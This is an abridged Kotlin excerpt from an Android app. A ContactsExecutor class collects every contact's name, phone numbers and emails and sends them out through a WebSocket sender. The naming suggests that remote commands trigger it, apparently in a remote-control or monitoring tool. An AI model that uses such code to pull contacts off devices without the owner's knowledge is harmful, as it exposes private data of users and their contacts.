...
class ContactsExecutor(context: Context) : BaseExecutor(context) {
    ...
    fun executeJsonForWeb() {
        if (!PermissionHelper.hasReadContacts(context)) {
            WebSocketSender.sendContactsData(emptyList()); return
        }
        try {
            ...
            resolver.query(
                ...
                while (cursor.moveToNext()) {
                    ...
                    resolver.query(
                        ...
                        while (eCur.moveToNext()) {
                            emails.add(eCur.getString(eCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)) ?: "")
                        }
                    }
                    result.add(mapOf("name" to name, "phones" to phones, "emails" to emails))
                }
            }
            WebSocketSender.sendContactsData(result)
        } catch (e: Exception) {
            Log.e(TAG, "executeJsonForWeb: ${e.message}")
            WebSocketSender.sendContactsData(emptyList())
        }
    }
